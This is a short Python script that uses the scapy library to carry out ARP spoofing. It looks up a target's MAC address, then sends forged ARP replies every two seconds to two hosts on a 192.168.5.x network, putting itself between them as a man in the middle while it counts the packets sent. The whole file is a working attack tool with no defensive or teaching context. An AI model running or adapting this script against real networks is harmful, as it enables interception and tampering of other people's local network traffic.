import scapy.all as scapy
import time
def get_mac(ip):
    arp_request=scapy.ARP(pdst=ip)
    broadcast=scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast=broadcast/arp_request
    ans=scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]

    return ans[0][1].hwsrc


def spoof(t_ip,s_ip):
    t_mac=get_mac(t_ip)
    packet=scapy.ARP(op=2,pdst=t_ip,hwdst=t_mac,psrc=s_ip)
    scapy.send(packet,verbose=False)

pc=0

try:

    while True:

        spoof("192.168.5.2","192.168.5.105")
        spoof("192.168.5.105","192.168.5.2")
        pc+=2
        print('\r[~] send packet '+str(pc),end="")

        time.sleep(2)

except KeyboardInterrupt :
    print('\n quitted the program')
